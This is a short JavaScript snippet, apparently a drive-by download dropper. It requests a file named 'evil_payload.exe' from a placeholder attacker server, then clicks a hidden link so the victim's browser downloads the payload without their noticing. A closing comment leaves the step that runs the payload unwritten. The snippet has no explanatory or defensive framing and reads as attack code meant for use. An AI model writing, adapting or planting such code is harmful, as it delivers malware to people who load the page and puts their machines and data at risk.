(() => {
    const evilPayloadUrl = "http://your-evil-server.com/evil_payload.exe";
    const tempDir = "evil_temp";
    const file = "evil_payload.exe";
  
    const xhr = new XMLHttpRequest();
    xhr.open("GET", evilPayloadUrl, true);
    xhr.responseType = "blob";
  
    xhr.onload = () => {
      if (xhr.status === 200) {
        const blob = xhr.response;
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.style.display = "none";
        a.href = url;
        a.download = file;
        document.body.appendChild(a);
        a.click();
        URL.revokeObjectURL(url);
      }
    };
  
    xhr.send();
  
    // The code to execute the payload goes here...
  })();
  